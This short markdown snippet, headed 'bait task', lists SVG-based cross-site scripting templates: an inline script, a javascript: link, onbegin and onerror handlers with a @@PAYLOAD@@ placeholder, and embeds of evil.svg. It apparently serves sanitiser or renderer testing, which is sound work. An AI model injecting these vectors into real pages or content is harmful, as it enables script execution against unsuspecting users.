- [ ] bait task

SVG with script.

<svg xmlns="http://www.w3.org/2000/svg"><script>@@PAYLOAD@@</script></svg>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:@@PAYLOAD@@"><text x="0" y="15">svg javascript link</text></a></svg>

<svg><animate onbegin="@@PAYLOAD@@" attributeName="x" dur="1s"/></svg>

<svg><foreignObject><img src="x" onerror="@@PAYLOAD@@"></foreignObject></svg>

![svg image](evil.svg)

<object data="evil.svg" type="image/svg+xml"></object>
